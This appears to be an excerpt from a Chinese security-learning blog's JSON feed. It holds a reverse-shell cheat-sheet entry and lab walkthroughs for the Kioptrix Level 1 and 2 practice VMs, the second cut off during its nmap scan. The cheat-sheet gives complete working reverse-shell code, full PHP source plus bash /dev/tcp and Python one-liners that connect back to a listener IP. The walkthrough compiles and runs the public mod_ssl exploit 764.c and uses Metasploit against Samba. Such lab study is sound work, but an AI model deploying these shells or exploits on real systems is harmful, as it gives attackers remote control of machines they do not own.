available.</span>\n<span>//</span>\n<span>// Usage</span>\n<span>// -----</span>\n<span>// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span>\n\n<span>set_time_limit</span> <span>(</span><span>0</span><span>)</span><span>;</span>\n<span>$VERSION</span> <span>=</span> <span>\"1.0\"</span><span>;</span>\n<span>$ip</span> <span>=</span> <span>'127.0.0.1'</span><span>;</span>  <span>// CHANGE THIS</span>\n<span>$port</span> <span>=</span> <span>1234</span><span>;</span>       <span>// CHANGE THIS</span>\n<span>$chunk_size</span> <span>=</span> <span>1400</span><span>;</span>\n<span>$write_a</span> <span>=</span> <span>null</span><span>;</span>\n<span>$error_a</span> <span>=</span> <span>null</span><span>;</span>\n<span>$shell</span> <span>=</span> <span>'uname -a; w; id; /bin/sh -i'</span><span>;</span>\n<span>$daemon</span> <span>=</span> <span>0</span><span>;</span>\n<span>$debug</span> <span>=</span> <span>0</span><span>;</span>\n\n<span>//</span>\n<span>// Daemonise ourself if possible to avoid zombies later</span>\n<span>//</span>\n\n<span>// pcntl_fork is hardly ever available, but will allow us to daemonise</span>\n<span>// our php process and avoid zombies.  Worth a try...</span>\n<span>if</span> <span>(</span><span>function_exists</span><span>(</span><span>'pcntl_fork'</span><span>)</span><span>)</span> <span>{</span>\n\t<span>// Fork and have the parent process exit</span>\n\t<span>$pid</span> <span>=</span> <span>pcntl_fork</span><span>(</span><span>)</span><span>;</span>\n\t\n\t<span>if</span> <span>(</span><span>$pid</span> <span>==</span> <span>-</span><span>1</span><span>)</span> <span>{</span>\n\t\t<span>printit</span><span>(</span><span>\"ERROR: Can't fork\"</span><span>)</span><span>;</span>\n\t\t<span>exit</span><span>(</span><span>1</span><span>)</span><span>;</span>\n\t<span>}</span>\n\t\n\t<span>if</span> <span>(</span><span>$pid</span><span>)</span> <span>{</span>\n\t\t<span>exit</span><span>(</span><span>0</span><span>)</span><span>;</span>  <span>// Parent exits</span>\n\t<span>}</span>\n\n\t<span>// Make the current process a session leader</span>\n\t<span>// Will only succeed if we forked</span>\n\t<span>if</span> <span>(</span><span>posix_setsid</span><span>(</span><span>)</span> <span>==</span> <span>-</span><span>1</span><span>)</span> <span>{</span>\n\t\t<span>printit</span><span>(</span><span>\"Error: Can't setsid()\"</span><span>)</span><span>;</span>\n\t\t<span>exit</span><span>(</span><span>1</span><span>)</span><span>;</span>\n\t<span>}</span>\n\n\t<span>$daemon</span> <span>=</span> <span>1</span><span>;</span>\n<span>}</span> <span>else</span> <span>{</span>\n\t<span>printit</span><span>(</span><span>\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"</span><span>)</span><span>;</span>\n<span>}</span>\n\n<span>// Change to a safe directory</span>\n<span>chdir</span><span>(</span><span>\"/\"</span><span>)</span><span>;</span>\n\n<span>// Remove any umask we inherited</span>\n<span>umask</span><span>(</span><span>0</span><span>)</span><span>;</span>\n\n<span>//</span>\n<span>// Do the reverse shell...</span>\n<span>//</span>\n\n<span>// Open reverse connection</span>\n<span>$sock</span> <span>=</span> <span>fsockopen</span><span>(</span><span>$ip</span><span>,</span> <span>$port</span><span>,</span> <span>$errno</span><span>,</span> <span>$errstr</span><span>,</span> <span>30</span><span>)</span><span>;</span>\n<span>if</span> <span>(</span><span>!</span><span>$sock</span><span>)</span> <span>{</span>\n\t<span>printit</span><span>(</span><span>\"<span><span>$errstr</span></span> (<span><span>$errno</span></span>)\"</span><span>)</span><span>;</span>\n\t<span>exit</span><span>(</span><span>1</span><span>)</span><span>;</span>\n<span>}</span>\n\n<span>// Spawn shell process</span>\n<span>$descriptorspec</span> <span>=</span> <span>array</span><span>(</span>\n   <span>0</span> <span>=></span> <span>array</span><span>(</span><span>\"pipe\"</span><span>,</span> <span>\"r\"</span><span>)</span><span>,</span>  <span>// stdin is a pipe that the child will read from</span>\n   <span>1</span> <span>=></span> <span>array</span><span>(</span><span>\"pipe\"</span><span>,</span> <span>\"w\"</span><span>)</span><span>,</span>  <span>// stdout is a pipe that the child will write to</span>\n   <span>2</span> <span>=></span> <span>array</span><span>(</span><span>\"pipe\"</span><span>,</span> <span>\"w\"</span><span>)</span>   <span>// stderr is a pipe that the child will write to</span>\n<span>)</span><span>;</span>\n\n<span>$process</span> <span>=</span> <span>proc_open</span><span>(</span><span>$shell</span><span>,</span> <span>$descriptorspec</span><span>,</span> <span>$pipes</span><span>)</span><span>;</span>\n\n<span>if</span> <span>(</span><span>!</span><span>is_resource</span><span>(</span><span>$process</span><span>)</span><span>)</span> <span>{</span>\n\t<span>printit</span><span>(</span><span>\"ERROR: Can't spawn shell\"</span><span>)</span><span>;</span>\n\t<span>exit</span><span>(</span><span>1</span><span>)</span><span>;</span>\n<span>}</span>\n\n<span>// Set everything to non-blocking</span>\n<span>// Reason: Occsionally reads will block, even though stream_select tells us they won't</span>\n<span>stream_set_blocking</span><span>(</span><span>$pipes</span><span>[</span><span>0</span><span>]</span><span>,</span> <span>0</span><span>)</span><span>;</span>\n<span>stream_set_blocking</span><span>(</span><span>$pipes</span><span>[</span><span>1</span><span>]</span><span>,</span> <span>0</span><span>)</span><span>;</span>\n<span>stream_set_blocking</span><span>(</span><span>$pipes</span><span>[</span><span>2</span><span>]</span><span>,</span> <span>0</span><span>)</span><span>;</span>\n<span>stream_set_blocking</span><span>(</span><span>$sock</span><span>,</span> <span>0</span><span>)</span><span>;</span>\n\n<span>printit</span><span>(</span><span>\"Successfully opened reverse shell to <span><span>$ip</span></span>:<span><span>$port</span></span>\"</span><span>)</span><span>;</span>\n\n<span>while</span> <span>(</span><span>1</span><span>)</span> <span>{</span>\n\t<span>// Check for end of TCP connection</span>\n\t<span>if</span> <span>(</span><span>feof</span><span>(</span><span>$sock</span><span>)</span><span>)</span> <span>{</span>\n\t\t<span>printit</span><span>(</span><span>\"ERROR: Shell connection terminated\"</span><span>)</span><span>;</span>\n\t\t<span>break</span><span>;</span>\n\t<span>}</span>\n\n\t<span>// Check for end of STDOUT</span>\n\t<span>if</span> <span>(</span><span>feof</span><span>(</span><span>$pipes</span><span>[</span><span>1</span><span>]</span><span>)</span><span>)</span> <span>{</span>\n\t\t<span>printit</span><span>(</span><span>\"ERROR: Shell process terminated\"</span><span>)</span><span>;</span>\n\t\t<span>break</span><span>;</span>\n\t<span>}</span>\n\n\t<span>// Wait until a command is end down $sock, or some</span>\n\t<span>// command output is available on STDOUT or STDERR</span>\n\t<span>$read_a</span> <span>=</span> <span>array</span><span>(</span><span>$sock</span><span>,</span> <span>$pipes</span><span>[</span><span>1</span><span>]</span><span>,</span> <span>$pipes</span><span>[</span><span>2</span><span>]</span><span>)</span><span>;</span>\n\t<span>$num_changed_sockets</span> <span>=</span> <span>stream_select</span><span>(</span><span>$read_a</span><span>,</span> <span>$write_a</span><span>,</span> <span>$error_a</span><span>,</span> <span>null</span><span>)</span><span>;</span>\n\n\t<span>// If we can read from the TCP socket, send</span>\n\t<span>// data to process's STDIN</span>\n\t<span>if</span> <span>(</span><span>in_array</span><span>(</span><span>$sock</span><span>,</span> <span>$read_a</span><span>)</span><span>)</span> <span>{</span>\n\t\t<span>if</span> <span>(</span><span>$debug</span><span>)</span> <span>printit</span><span>(</span><span>\"SOCK READ\"</span><span>)</span><span>;</span>\n\t\t<span>$input</span> <span>=</span> <span>fread</span><span>(</span><span>$sock</span><span>,</span> <span>$chunk_size</span><span>)</span><span>;</span>\n\t\t<span>if</span> <span>(</span><span>$debug</span><span>)</span> <span>printit</span><span>(</span><span>\"SOCK: <span><span>$input</span></span>\"</span><span>)</span><span>;</span>\n\t\t<span>fwrite</span><span>(</span><span>$pipes</span><span>[</span><span>0</span><span>]</span><span>,</span> <span>$input</span><span>)</span><span>;</span>\n\t<span>}</span>\n\n\t<span>// If we can read from the process's STDOUT</span>\n\t<span>// send data down tcp connection</span>\n\t<span>if</span> <span>(</span><span>in_array</span><span>(</span><span>$pipes</span><span>[</span><span>1</span><span>]</span><span>,</span> <span>$read_a</span><span>)</span><span>)</span> <span>{</span>\n\t\t<span>if</span> <span>(</span><span>$debug</span><span>)</span> <span>printit</span><span>(</span><span>\"STDOUT READ\"</span><span>)</span><span>;</span>\n\t\t<span>$input</span> <span>=</span> <span>fread</span><span>(</span><span>$pipes</span><span>[</span><span>1</span><span>]</span><span>,</span> <span>$chunk_size</span><span>)</span><span>;</span>\n\t\t<span>if</span> <span>(</span><span>$debug</span><span>)</span> <span>printit</span><span>(</span><span>\"STDOUT: <span><span>$input</span></span>\"</span><span>)</span><span>;</span>\n\t\t<span>fwrite</span><span>(</span><span>$sock</span><span>,</span> <span>$input</span><span>)</span><span>;</span>\n\t<span>}</span>\n\n\t<span>// If we can read from the process's STDERR</span>\n\t<span>// send data down tcp connection</span>\n\t<span>if</span> <span>(</span><span>in_array</span><span>(</span><span>$pipes</span><span>[</span><span>2</span><span>]</span><span>,</span> <span>$read_a</span><span>)</span><span>)</span> <span>{</span>\n\t\t<span>if</span> <span>(</span><span>$debug</span><span>)</span> <span>printit</span><span>(</span><span>\"STDERR READ\"</span><span>)</span><span>;</span>\n\t\t<span>$input</span> <span>=</span> <span>fread</span><span>(</span><span>$pipes</span><span>[</span><span>2</span><span>]</span><span>,</span> <span>$chunk_size</span><span>)</span><span>;</span>\n\t\t<span>if</span> <span>(</span><span>$debug</span><span>)</span> <span>printit</span><span>(</span><span>\"STDERR: <span><span>$input</span></span>\"</span><span>)</span><span>;</span>\n\t\t<span>fwrite</span><span>(</span><span>$sock</span><span>,</span> <span>$input</span><span>)</span><span>;</span>\n\t<span>}</span>\n<span>}</span>\n\n<span>fclose</span><span>(</span><span>$sock</span><span>)</span><span>;</span>\n<span>fclose</span><span>(</span><span>$pipes</span><span>[</span><span>0</span><span>]</span><span>)</span><span>;</span>\n<span>fclose</span><span>(</span><span>$pipes</span><span>[</span><span>1</span><span>]</span><span>)</span><span>;</span>\n<span>fclose</span><span>(</span><span>$pipes</span><span>[</span><span>2</span><span>]</span><span>)</span><span>;</span>\n<span>proc_close</span><span>(</span><span>$process</span><span>)</span><span>;</span>\n\n<span>// Like print, but does nothing if we've daemonised ourself</span>\n<span>// (I can't figure out how to redirect STDOUT like a proper daemon)</span>\n<span>function</span> <span>printit</span> <span>(</span><span>$string</span><span>)</span> <span>{</span>\n\t<span>if</span> <span>(</span><span>!</span><span>$daemon</span><span>)</span> <span>{</span>\n\t\t<span>print</span> <span>\"<span><span>$string</span></span>\\n\"</span><span>;</span>\n\t<span>}</span>\n<span>}</span>\n\n<span>?></span></span> \n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br><span>126</span><br><span>127</span><br><span>128</span><br><span>129</span><br><span>130</span><br><span>131</span><br><span>132</span><br><span>133</span><br><span>134</span><br><span>135</span><br><span>136</span><br><span>137</span><br><span>138</span><br><span>139</span><br><span>140</span><br><span>141</span><br><span>142</span><br><span>143</span><br><span>144</span><br><span>145</span><br><span>146</span><br><span>147</span><br><span>148</span><br><span>149</span><br><span>150</span><br><span>151</span><br><span>152</span><br><span>153</span><br><span>154</span><br><span>155</span><br><span>156</span><br><span>157</span><br><span>158</span><br><span>159</span><br><span>160</span><br><span>161</span><br><span>162</span><br><span>163</span><br><span>164</span><br><span>165</span><br><span>166</span><br><span>167</span><br><span>168</span><br><span>169</span><br><span>170</span><br><span>171</span><br><span>172</span><br><span>173</span><br><span>174</span><br><span>175</span><br><span>176</span><br><span>177</span><br><span>178</span><br><span>179</span><br><span>180</span><br><span>181</span><br><span>182</span><br><span>183</span><br><span>184</span><br><span>185</span><br><span>186</span><br><span>187</span><br><span>188</span><br><span>189</span><br></div></div><h2 id=\"bash\"> bash</h2>\n<div><pre><code>bash -i &gt;&amp; /dev/tcp/10.10.14.25/4445 0&gt;&amp;1\n</code></pre>\n<div><span>1</span><br></div></div><h2 id=\"python\"> python</h2>\n<div><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.102&quot;,4321));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;\n\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div>",
      "date_published": "2022-04-10T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "索引",
      "url": "http://www.liuhanzhe.com/docs/security/%E7%B4%A2%E5%BC%95/",
      "id": "http://www.liuhanzhe.com/docs/security/%E7%B4%A2%E5%BC%95/",
      "content_html": "<h3 id=\"渗透\"> 渗透</h3>\n<ul>\n<li>\n<p><a href=\"./渗透/0.readme.html\">渗透</a> - 渗透学习总结记录</p>\n</li>\n<li>\n<p><a href=\"./靶机/0.readme.html\">靶机</a> - 靶机练习Walkthrough记录</p>\n</li>\n</ul>\n<hr>\n<h3 id=\"逆向\"> 逆向</h3>\n<ul>\n<li><a href=\"./逆向/0.readme.html\">学习</a> - 逆向学习总结记录</li>\n</ul>\n<hr>\n<h3 id=\"ctf\"> CTF</h3>\n<ul>\n<li><a href=\"./ctf/other/0.readme.html\">学习</a> - CTF学习总结记录</li>\n<li><a href=\"./ctf/writeup/0.readme.html\">writeup</a> - CTF练习writeup记录</li>\n</ul>\n<hr>\n<h3 id=\"工具\"> 工具</h3>\n<ul>\n<li><a href=\"./tools/0.索引.html\">索引</a> - 工具使用总结记录</li>\n</ul>\n<hr>\n<h3 id=\"其他\"> 其他</h3>\n<ul>\n<li><a href=\"./其他/0.readme.html\">其他</a> - 安全相关其他内容学习总结记录</li>\n</ul>\n<hr>\n",
      "date_published": "2022-04-20T06:36:02.000Z",
      "date_modified": "2022-04-21T09:01:53.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": []
    },
    {
      "title": "逆向",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%80%86%E5%90%91/0.readme/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%80%86%E5%90%91/0.readme/",
      "content_html": "<ul>\n<li><a href=\"./1.JAVA中jar包反编译再重新生成jar文件.html\">1.JAVA中jar包反编译再重新生成jar文件</a></li>\n</ul>\n",
      "date_published": "2022-04-21T09:01:53.000Z",
      "date_modified": "2022-04-21T09:01:53.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": []
    },
    {
      "title": "靶机 KIOPTRIX:LEVEL 1 Walkthrough",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/Kioptrix_1/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/Kioptrix_1/",
      "content_html": "<h2 id=\"_0x01-扫描\"> 0x01 扫描</h2>\n<p>扫描IP，发现主机IP</p>\n<p>192.168.56.104</p>\n<p>扫描端口</p>\n<p><code>nmap -T5 -A -v -p- 192.168.56.104</code></p>\n<div><pre><code>└─$ nmap -T5 -A -v -p- 192.168.56.104  \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 00:14 EDT\nNSE: Loaded 155 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 0.00s elapsed\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 0.00s elapsed\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 0.00s elapsed\nInitiating Ping Scan at 00:14\nScanning 192.168.56.104 [2 ports]\nCompleted Ping Scan at 00:14, 0.00s elapsed (1 total hosts)\nmass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers\nInitiating Connect Scan at 00:14\nScanning 192.168.56.104 [65535 ports]\nDiscovered open port 443/tcp on 192.168.56.104\nDiscovered open port 111/tcp on 192.168.56.104\nDiscovered open port 80/tcp on 192.168.56.104\nDiscovered open port 139/tcp on 192.168.56.104\nDiscovered open port 22/tcp on 192.168.56.104\nDiscovered open port 1024/tcp on 192.168.56.104\nCompleted Connect Scan at 00:14, 4.34s elapsed (65535 total ports)\nInitiating Service scan at 00:14\nScanning 6 services on 192.168.56.104\nCompleted Service scan at 00:14, 11.01s elapsed (6 services on 1 host)\nNSE: Script scanning 192.168.56.104.\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 10.42s elapsed\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 1.15s elapsed\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 0.00s elapsed\nNmap scan report for 192.168.56.104\nHost is up (0.00031s latency).\nNot shown: 65529 closed tcp ports (conn-refused)\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)\n| ssh-hostkey: \n|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)\n|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)\n|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)\n|_sshv1: Server supports SSHv1\n80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-title: Test Page for the Apache Web Server on Red Hat Linux\n| http-methods: \n|   Supported Methods: GET HEAD OPTIONS TRACE\n|_  Potentially risky methods: TRACE\n111/tcp  open  rpcbind     2 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1           1024/tcp   status\n|_  100024  1           1024/udp   status\n139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)\n443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Public Key type: rsa\n| Public Key bits: 1024\n| Signature Algorithm: md5WithRSAEncryption\n| Not valid before: 2009-09-26T09:32:06\n| Not valid after:  2010-09-26T09:32:06\n| MD5:   78ce 5293 4723 e7fe c28d 74ab 42d7 02f1\n|_SHA-1: 9c42 91c3 bed2 a95b 983d 10ac f766 ecb9 8766 1d33\n|_ssl-date: 2022-03-21T17:14:49+00:00; +12h59m59s from scanner time.\n| http-methods: \n|_  Supported Methods: GET HEAD POST\n| sslv2: \n|   SSLv2 supported\n|   ciphers: \n|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5\n|     SSL2_RC4_128_EXPORT40_WITH_MD5\n|     SSL2_RC4_128_WITH_MD5\n|     SSL2_DES_64_CBC_WITH_MD5\n|     SSL2_RC4_64_WITH_MD5\n|     SSL2_RC2_128_CBC_WITH_MD5\n|_    SSL2_DES_192_EDE3_CBC_WITH_MD5\n|_http-title: 400 Bad Request\n1024/tcp open  status      1 (RPC #100024)\n\nHost script results:\n|_clock-skew: 12h59m58s\n|_smb2-time: Protocol negotiation failed (SMB2)\n| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)\n| Names:\n|   KIOPTRIX&lt;00&gt;         Flags: &lt;unique&gt;&lt;active&gt;\n|   KIOPTRIX&lt;03&gt;         Flags: &lt;unique&gt;&lt;active&gt;\n|   KIOPTRIX&lt;20&gt;         Flags: &lt;unique&gt;&lt;active&gt;\n|   \\x01\\x02__MSBROWSE__\\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;\n|   MYGROUP&lt;00&gt;          Flags: &lt;group&gt;&lt;active&gt;\n|   MYGROUP&lt;1d&gt;          Flags: &lt;unique&gt;&lt;active&gt;\n|_  MYGROUP&lt;1e&gt;          Flags: &lt;group&gt;&lt;active&gt;\n\nNSE: Script Post-scanning.\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 0.00s elapsed\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 0.00s elapsed\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 27.20 seconds\n\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br></div></div><h2 id=\"_0x02-方法一\"> 0x02 方法一</h2>\n<p>发现samba，使用smbclinet没有扫出来版本，使用msf扫描发现版本</p>\n<p><img src=\"/assets/img/image-20220415181220010.png\" alt=\"image-20220415181220010\" /></p>\n<p>搜索exp发现</p>\n<p><img src=\"/assets/img/image-20220415181234735.png\" alt=\"image-20220415181234735\" /></p>\n<p>使用msf利用</p>\n<p><img src=\"/assets/img/image-20220415181245923.png\" alt=\"image-20220415181245923\" /></p>\n<p>尝试payload，修改LHOST后利用成功，获得root权限</p>\n<p><img src=\"/assets/img/image-20220415181255633.png\" alt=\"image-20220415181255633\" /></p>\n<p><img src=\"/assets/img/image-20220415181300663.png\" alt=\"image-20220415181300663\" /></p>\n<h2 id=\"_0x03-方法二\"> 0x03 方法二</h2>\n<p>​\t使用nikto扫描</p>\n<p><img src=\"/assets/img/image-20220415181311227.png\" alt=\"image-20220415181311227\" /></p>\n<p>发现mod_ssl存在问题，搜索exp</p>\n<p><img src=\"/assets/img/image-20220415181318656.png\" alt=\"image-20220415181318656\" /></p>\n<p>尝试使用764</p>\n<p>还需要安装libssl-dev:</p>\n<div><pre><code>apt-get install libssl-dev\n</code></pre>\n<div><span>1</span><br></div></div><p>编译764.c</p>\n<div><pre><code>gcc -o 764 764.c -lcrypto\n</code></pre>\n<div><span>1</span><br></div></div><p>执行exp</p>\n<div><pre><code>./764 0x6b 192.168.56.104 443 -c 50\n</code></pre>\n<div><span>1</span><br></div></div><p>因为网络问题，目标机无法下载COMMAND2下载提权代码，所以只获得apache权限，正常情况下可以直接获得root权限</p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20220415181220010.png",
      "date_published": "2022-03-21T00:00:00.000Z",
      "date_modified": "2022-04-21T09:36:50.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "靶机 KIOPTRIX:LEVEL 2 Walkthrough",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/Kioptrix_2/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/Kioptrix_2/",
      "content_html": "<h2 id=\"_0x01-扫描\"> 0x01 扫描</h2>\n<p>目标IP: 192.168.56.105</p>\n<p>nmap扫描</p>\n<div><pre><code>─$ nmap -T5 -A -v -p- <span>192.168</span>.56.105\nStarting Nmap <span>7.92</span> <span>(</span> https://nmap.org <span>)</span> at <span>2022</span>-03-21 02:14 EDT\nNSE: Loaded <span>155</span> scripts <span>for</span> scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 02:14\nCompleted NSE at 02:14, <span>0</span>.00s elapsed\nInitiating NSE at 02:14\nCompleted NSE at 02:14, <span>0</span>.00s elapsed\nInitiating NSE at 02:14\nCompleted NSE at 02:14, <span>0</span>.00s elapsed\nInitiating Ping Scan at 02:14\nScanning <span>192.168</span>.56.105 <span>[</span><span>2</span> ports<span>]</span>\nCompleted Ping Scan at 02:14, <span>0</span>.00s elapsed <span>(</span><span>1</span> total hosts<span>)</span>\nmass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers\nInitiating Connect Scan at 02:14\nScanning <span>192.168</span>.56.105 <span>[</span><span>65535</span> ports<span>]</span>\nDiscovered <span>open</span> port <span>111</span>/tcp on <span>192.168</span>.56.105\nDiscovered <span>open</span> port <span>80</span>/tcp on <span>192.168</span>.56.105\nDiscovered <span>open</span> port <span>443</span>/tcp on <span>192.168</span>.56.105\nDiscovered <span>open</span> port <span>3306</span>/tcp on <span>192.168</span>.56.105\nDiscovered <span>open</span> port <span>22</span>/tcp on <span>192.168</span>.56.105\nDiscovered <span>open</span> port <span>631</span>/tcp on <span>192.168</span>.56.105\nDiscovered <span>open</span> port <span>676</span>/tcp on <span>192.168</span>.56.105\nCompleted Connect Scan at 02:14, <span>1</span>.95s elapsed <span>(</span><span>65535</span> total ports<span>)</span>\nInitiating Service scan at 02:14\nScanning <span>7</span> services on <span>192.168</span>.56.105\nCompleted Service scan at 02:14, <span>12</span>.02s elapsed <span>(</span><span>7</span> services on <span>1</span> <span>host</span><span>)</span>\nNSE: Script scanning <span>192.168</span>.56.105.\nInitiating NSE at 02:14\nCompleted NSE at 02:14, <span>0</span>.77s elapsed\nInitiating NSE at 02:14\nCompleted NSE at 02:14, <span>1</span>.15s elapsed\nInitiating NSE at 02:14\nCompleted NSE at 02:14, <span>0</span>.00s elapsed\nNmap scan report <span>for</span> <span>192.168</span>.56.105\nHost is up <span>(</span><span>0</span>.0069s latency<span>)</span>.\nNot shown: <span>65528</span> closed tcp ports <span>(</span>conn-refused<span>)</span>\nPORT     STATE SERVICE  VERSION\n<span>22</span>/tcp   <span>open</span>  <span>ssh</span>      OpenSSH <span>3</span>.9p1 <span>(</span>protocol <span>1.99</span><span>)</span>\n<span>|</span>_sshv1: Server supports SSHv1\n<span>|</span> ssh-hostkey: \n<span>|</span>   <span>1024</span> 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 <span>(</span>RSA1<span>)</span>\n<span>|</span>   <span>1024</span> <span>34</span>:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 <span>(</span>DSA<span>)</span>\n<span>|</span>_  <span>1024</span> <span>68</span>:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 